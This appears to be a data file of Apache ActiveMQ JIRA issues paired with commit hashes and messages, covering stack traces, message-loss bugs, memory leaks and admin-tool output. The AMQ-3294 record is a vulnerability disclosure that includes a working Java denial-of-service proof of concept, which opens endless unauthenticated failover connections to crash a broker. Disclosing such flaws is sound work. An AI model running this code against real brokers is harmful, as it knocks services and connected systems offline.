	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203)
	at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75)
	at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:729)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193)
	at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:652)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203)
	at java.lang.Thread.run(Thread.java:662)
2011-06-30 16:02:09,912 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an Exception adding a message: ActiveMQBytesMessage {commandId = 19796,
 responseRequired = false, messageId = ID:bigmacli-40948-1309463846336-2:105:-1:1:19794, originalDestination = null, originalTransactionId = null, producerId = ID:bigmacli-
40948-1309463846336-2:105:-1:1, destination = queue://loadq-3, transactionId = null, expiration = 0, timestamp = 1309464129898, arrival = 0, brokerInTime = 1309464129898, 
brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, 
userID = null, content = org.apache.activemq.util.ByteSequence@665e2517, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, 
readOnlyProperties = true, readOnlyBody = true, droppable = false} ActiveMQBytesMessage{ bytesOut = null, dataOut = null, dataIn = null } first to FilePendingMessageCursor 

java.lang.RuntimeException: java.lang.NullPointerException
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193)
	at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:652)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.NullPointerException
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203)
	at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75)
	at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:729)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454)
	... 28 more

 

2011-06-30 16:02:44,121 [Queue:loadq-9  ] ERROR Queue                          - Failed to page in more queue messages 
java.util.NoSuchElementException: Chunk stream does not exist, page: 63122 is marked free
	at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:149)
	at org.apache.kahadb.index.ListNode$ListIterator.hasNext(ListNode.java:160)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.hasNext(PList.java:203)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.hasNext(FilePendingMessageCursor.java:496)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.hasNext(FilePendingMessageCursor.java:288)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1725)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
Caused by: java.io.EOFException: Chunk stream does not exist, page: 63122 is marked free
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:456)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:433)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:430)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:406)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:363)
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:201)
	at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:147)
	... 9 more

 

2011-06-30 16:02:49,401 [Queue:loadq-4  ] ERROR Queue                          - Failed to page in more queue messages 
java.util.NoSuchElementException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:213)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:192)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:501)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:485)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:296)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1726)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
Caused by: java.io.IOException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log
	at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350)
	at org.apache.kahadb.journal.Journal.read(Journal.java:597)
	at org.apache.activemq.store.kahadb.plist.PListStore.getPayload(PListStore.java:367)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:211)
	... 9 more{code}",fa2b058dd52fb447b893512dfbb5eb370c456926,"https://issues.apache.org/jira/browse/AMQ-3375: stomp consumer might not receive all msgs of a virtual topic queue with memory limits. Committing tims test case which works fine post resolution of https://issues.apache.org/jira/browse/AMQ-3434

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1153463 13f79535-47bb-0310-9956-ffa450edef68"
12515816,AMQ-3427,"
This is due to the maven-war-plugin, patch forthcoming.


[INFO] Packaging webapp
[INFO] ------------------------------------------------------------------------
[ERROR] FATAL ERROR
[INFO] ------------------------------------------------------------------------
[INFO] Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
---- Debugging information ----
message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException
cause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
class               : org.apache.maven.plugin.war.util.WebappStructure
required-type       : org.apache.maven.plugin.war.util.WebappStructure
path                : /webapp-structure
line number         : 1
-------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] Trace
com.thoughtworks.xstream.converters.ConversionException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
---- Debugging information ----
message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException
cause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
class               : org.apache.maven.plugin.war.util.WebappStructure
required-type       : org.apache.maven.plugin.war.util.WebappStructure
path                : /webapp-structure
line number         : 1
-------------------------------
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshall
er.java:89)
        at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(A
bstractReferenceUnmarshaller.java:63)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:76)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:60)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:137)
        at com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:33)
        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:923)
        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:909)
        at com.thoughtworks.xstream.XStream.fromXML(XStream.java:853)
        at org.apache.maven.plugin.war.util.WebappStructureSerializer.fromXml(WebappStructureSerializer.java:73)
        at org.apache.maven.plugin.war.AbstractWarMojo.buildWebapp(AbstractWarMojo.java:423)
        at org.apache.maven.plugin.war.AbstractWarMojo.buildExplodedWebapp(AbstractWarMojo.java:394)
        at org.apache.maven.plugin.war.WarMojo.performPackaging(WarMojo.java:195)
        at org.apache.maven.plugin.war.WarMojo.execute(WarMojo.java:157)
        at org.apache.maven.plugin.DefaultPluginManager.executeMojo(DefaultPluginManager.java:490)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(DefaultLifecycleExecutor.java:694)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalWithLifecycle(DefaultLifecycleExecutor.java:556)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(DefaultLifecycleExecutor.java:535)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(DefaultLifecycleExecutor.java:387)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(DefaultLifecycleExecutor.java:348)
        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(DefaultLifecycleExecutor.java:180)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:328)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:138)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:362)
        at org.apache.maven.cli.compat.CompatibleMain.main(CompatibleMain.java:60)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at org.codehaus.classworlds.Launcher.launchEnhanced(Launcher.java:315)
        at org.codehaus.classworlds.Launcher.launch(Launcher.java:255)
        at org.codehaus.classworlds.Launcher.mainWithExitCode(Launcher.java:430)
        at org.codehaus.classworlds.Launcher.main(Launcher.java:375)
Caused by: com.thoughtworks.xstream.converters.reflection.ObjectAccessException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor
        at com.thoughtworks.xstream.converters.reflection.PureJavaReflectionProvider.newInstance(PureJavaReflectionProvider.java:71)
        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.instantiateNewInstance(AbstractReflectionConverter.java:308)
        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal(AbstractReflectionConverter.java:161)
        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:82)
        ... 32 more",bb2f0db7b8146aa1931d183caa3bb697838f540f,"https://issues.apache.org/jira/browse/AMQ-3427 - maven jar and archiver plugin updates

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1163987 13f79535-47bb-0310-9956-ffa450edef68"
12514497,AMQ-3405,"1. Message in queue A fails enough times to be moved to the DLQ.
2. We move/copy the message back to queue A to attempt reprocessing. Invoking the retry operation from JMX can also be used.
3. The consumer once again fails to consume the message greater than the max number of times.
4. The message is not put back into the DLQ. If it was moved rather than copied, it means we have a message that was never successfully consumed, but has nevertheless disappeared.

This is all with the default ActiveMQ settings, though I tried adjusted the DLQ configuration to support both expired and non-persistent messages.

I found this posting which seems to indicate the same issue I am seeing: http://www.mail-archive.com/users@activemq.apache.org/msg09683.html. One difference that I am seeing is that restarting ActiveMQ does not cause the message to show up in the DLQ again. Once it is lost, it is lost forever.

To replicate this, I believe you can use a consumer that just fails on every invocation.

One interesting thing is that if I put a message into the DLQ directly, then move it to a queue with a consumer, it will end up in the DLQ again as you would expect. If I then move the DLQ message back to the original queue, it will then show the bevahiour outlined above.",f1f6894ed71da0f7add81b3d9a82c6f33f812efb,"Test case to show that https://issues.apache.org/jira/browse/AMQ-3405 is not a bug.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1158471 13f79535-47bb-0310-9956-ffa450edef68"
12514469,AMQ-3404,"The admin purge command does not work with a message selector.
A patch is forth coming, there is some cleanup, and compliance to be vetted before I can attach the patch.

(1) Browse with no arguments:

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58531k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608108263

JMS_HEADER_FIELD:JMSTimestamp = 1310608108740

JMS_HEADER_FIELD:JMSTimestamp = 1310608109283

JMS_HEADER_FIELD:JMSTimestamp = 1310608109790

JMS_HEADER_FIELD:JMSTimestamp = 1310608110324

JMS_HEADER_FIELD:JMSTimestamp = 1310608110831

JMS_HEADER_FIELD:JMSTimestamp = 1310608111374

JMS_HEADER_FIELD:JMSTimestamp = 1310608111872

JMS_HEADER_FIELD:JMSTimestamp = 1310608112415

JMS_HEADER_FIELD:JMSTimestamp = 1310608113005



(2) Browse with msgsel

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel 'JMSTimestamp<1310608110324' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58535k  max=902976k
     JVM args: -Dactivemq.classpath=""""
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608108263

JMS_HEADER_FIELD:JMSTimestamp = 1310608108740

JMS_HEADER_FIELD:JMSTimestamp = 1310608109283

JMS_HEADER_FIELD:JMSTimestamp = 1310608109790

(3) Purge with msgsel: - Not Working -  (what I wanted here was to use only those
matching my criteria)

user@activemq-master:~/activemq$ activemq-admin purge --msgsel 'JMSTimestamp<1310608110324' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58531k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

Connecting to JMX URL:
service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:1
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:2
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:3
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:4
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:5
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:6
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:7
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:8
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:9
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:10
from queue: queue.FOO.BAR


(4) Purge with msgsel working with a patch:

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel 'JMSTimestamp<1310608391914' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58535k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608389116

JMS_HEADER_FIELD:JMSTimestamp = 1310608389607

JMS_HEADER_FIELD:JMSTimestamp = 1310608390266

JMS_HEADER_FIELD:JMSTimestamp = 1310608390781

JMS_HEADER_FIELD:JMSTimestamp = 1310608391390



user@activemq-master:~/activemq$ ./activemq-admin purge  --msgsel 'JMSTimestamp<1310608391914'  queue.FOO.BAR 

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58575k  max=902976k
     JVM args: -Dactivemq.classpath="""" 

     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

Connecting to JMX URL:
service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO: Addobjects is :[JMSTimestamp<1310608391914]
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:1
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:2
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:3
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:4
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:5
from queue: queue.FOO.BAR

",fd37c9f96822a3dde1092d65b6c443ebecab0962,"https://issues.apache.org/jira/browse/AMQ-3404 and https://issues.apache.org/jira/browse/AMQ-3410 tests

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1149492 13f79535-47bb-0310-9956-ffa450edef68"
12511337,AMQ-3375,"Have a testcase that connects a Java stomp consumer to a virtual destination queue and consumes a fixed amount of msgs.
During the test I noticed that the consumer does not always receive the full amount of msgs.
Instead the receive times out although JMX QueueSize property is greater than 0. However when trying to browse the queue using JMX, it returns null, despite the fact that not all msgs got dequeued yet (dispatch and dequeue counter < enqueue counter).

So far I reproduced this with a stomp producer/consumer only. The producer writes msgs to a virtual topic VirtualTopic.Foo and the consumer takes msgs off the Consumer.A.VirtualTopic.Foo queue. Using JMX I noticed all msgs got moved from the virtual topic to the queue (reflected by JMX enqueue counter) but not all msgs got consumed.

So it seems the broker lost some msgs on the way. ",fa2b058dd52fb447b893512dfbb5eb370c456926,"https://issues.apache.org/jira/browse/AMQ-3375: stomp consumer might not receive all msgs of a virtual topic queue with memory limits. Committing tims test case which works fine post resolution of https://issues.apache.org/jira/browse/AMQ-3434

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1153463 13f79535-47bb-0310-9956-ffa450edef68"
12506889,AMQ-3316,"We discovered a memory leak in {{ConnectionStateTracker}} in case a long-lived connection with prefetch=0 is used.

If prefetch=0 is used, {{MessagePull}} objects are enqueued in {{messageCache}} with an estimated size of 400. But in the cache's {{removeEldestEntry()}} method no size is subtracted from {{currentCacheSize}} for {{MessagePull}} instances. This messes with the cache as it will continue to remove objects even if there is space in the cache. But after about 5,368,709 consumed messages this will cause the {{currentCacheSize}} to roll-over maximum integer and become negative. As a consequence, for the next about 5,368,709 no messages will be removed from the cache any longer.

This sooner or later will trigger out-of-memory conditions, depending on the size of the various pools. In our case this caused out-of-memory in PermGen first, as message IDs seem to be internalized, and PermGen is considerably smaller than the heap.",a1c19c5e49db4312d2f27e0ef60945c13c4f6fa7,"https://issues.apache.org/jira/browse/AMQ-3316 - Memory leak in ConnectionStateTracker with MessagePull objects. Patch applied with thanks, good catch\!

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1102018 13f79535-47bb-0310-9956-ffa450edef68"
12506378,AMQ-3303,"Null pointer exception when accessing the JSPs if the first jmx server (here activemq-1) in the jmx url is the slave.
findBrokers in RemoteJMXBrokerFacade finds the slave broker but accessing some of its attributes results in a NullPointerException.",f5dd1256e467966f14a7447a4cd1fc45f21f19a3,https://issues.apache.org/jira/browse/AMQ-3303 - test that validates fix
12505000,AMQ-3294,"Abusing the 'failover' feature in ActiveMQ, an unauthenticated user can trigger a Denial of Service condition against the broker service. 

In detail, an attacker can issue multiple ActiveMQ openwire connection requests using the following connection string:  failover:tcp://<IP>:61616

Due to the 'failure' mechanism, all TCP connections remain active even if a valid session is not created. 
Please note that no valid credentials have been used. 

After a few thousand requests, a ""java.net.SocketException: Too many open files"" exception is triggered causing the freeze/crash of the broker. Connected systems may crash as well. 

During my test, the attack took around 4 minutes (in a local network) and it is highly reliable. This is most likely an abuse of the 'failover' functionality.

I've been testing version 5.2.0 and also the latest 5.5.0 release. As both releases are affected, I assume that this issue is present in other versions as well. The problem appears in the default configuration as well as with different authentication plugins enabled.

Proof-Of-Concept:

--------------------
package openwireclient;

import javax.jms.*;
import org.apache.activemq.ActiveMQConnectionFactory;

public class GoAndCrash {

    private static String url = ""failover:tcp://"";

    public static void main(String[] args) throws JMSException {

        System.out.println(""\n--[ ActiveMQ Denial of Service PoC ]\n"");

        url = url.concat(args[0] + "":"" + args[1]);
        int cont = 0;

        while (true) {
            try {
                System.out.println(""[*] Request #"" + cont);
                ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""invalidUser"", ""invalidPass"", url);
                Connection connection = connectionFactory.createConnection();
                cont++;
                connection.start();
            } catch (Exception ex) {
               //do nothing
            }
        }
    }
}
--------------------
",2bfd88e87d922afbad81972490ff7b8dbe967f53,"https://issues.apache.org/jira/browse/AMQ-3294 - disable this test as it causes hudson to hang. need to investigate reuse of send timeout for all sync operations and maxreconnect attempts on failover transport to fix up correctly.. one to revisit for case where exception other than security exception comes back or nothing in the case of max connections exceeded

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1213642 13f79535-47bb-0310-9956-ffa450edef68"
12504783,AMQ-3289,"The oracle persistence adapter extends the blob jdbc adapter but it has gotten out of sync with the method overrides. @Override to the rescue for the future.
The blob adapter uses native blob streaming to insert data (which can accommodate > 4k) but it has been out of step for some time.
The implementations need to be brought into line w.r.t to the api, schema and locking.",7539c7e9753fffddeb07042bf288512131989ddd,"https://issues.apache.org/jira/browse/AMQ-3289 - fix missing dummy arg for blob in initial insert

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140872 13f79535-47bb-0310-9956-ffa450edef68"
12504381,AMQ-3283,"The doc of the [maven-activemq-perf-plugin|http://activemq.apache.org/activemq-performance-module-users-manual.html] lists these options:
producer.sessTransacted
consumer.sessTransacted

However they don't work. Nowhere in the code is a commit() for the transaction. 

",459be2d0fbdc790a379b1a8e7ec4dccbcdd821d7,"https://issues.apache.org/jira/browse/AMQ-3283 - transaction support for perf plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1092753 13f79535-47bb-0310-9956-ffa450edef68"
12503279,AMQ-3262,"When you close the queue browser before you iterated through all messages, it will mark those unbrowsed messages as not consumed and they will be dispatched first to the next consumer.

This changes the original delivery order of messages.

Message browser should not change message delivery order in any way.",1760d1aefb6d85799fc6d5ab0b13d6bb70e8f220,"https://issues.apache.org/jira/browse/AMQ-3262 - queue browser and message order

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1088593 13f79535-47bb-0310-9956-ffa450edef68"
12500519,AMQ-3202,When sending a MapMessage with no body to a client that's connected via HTTP an exception is thrown when the message is unmarshaled from XML and the copy method is invoked.  ,34242e246e750bf27309c1fb2701a2553625ca0e,"Test case for: https://issues.apache.org/jira/browse/AMQ-3202

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1078311 13f79535-47bb-0310-9956-ffa450edef68"
12499922,AMQ-3193,"Follow these steps to reproduce the problem:
* start broker
* start a producer and send two or more messages to a queue
* start jconsole
* click on the queue and select Operations.
* click browse and copy the JMSMessageID of the first message into clipboard
* invoke JMX operation removeMatchingMessages() with argument JMSMessageID='<message id>' , where <message id> is the copied JMSMessageID.
* verify that >= 1 message are still on the queue
* now start a consumer that connects to this queue. It won't get any messages.
",99653c6c8c0d422eac64b538b24ae13be3227be5,"https://issues.apache.org/jira/browse/AMQ-3193 - consumers don't get messages after JMX remove

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1075346 13f79535-47bb-0310-9956-ffa450edef68"
12499922,AMQ-3193,"Follow these steps to reproduce the problem:
* start broker
* start a producer and send two or more messages to a queue
* start jconsole
* click on the queue and select Operations.
* click browse and copy the JMSMessageID of the first message into clipboard
* invoke JMX operation removeMatchingMessages() with argument JMSMessageID='<message id>' , where <message id> is the copied JMSMessageID.
* verify that >= 1 message are still on the queue
* now start a consumer that connects to this queue. It won't get any messages.
",d8fd5330a4fb4b7d5054bab8ba11686de647a7a3,"https://issues.apache.org/jira/browse/AMQ-3193 - implement equals for indirect message ref, so remove from pendingdispatch will work on moveMessages

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1075864 13f79535-47bb-0310-9956-ffa450edef68"
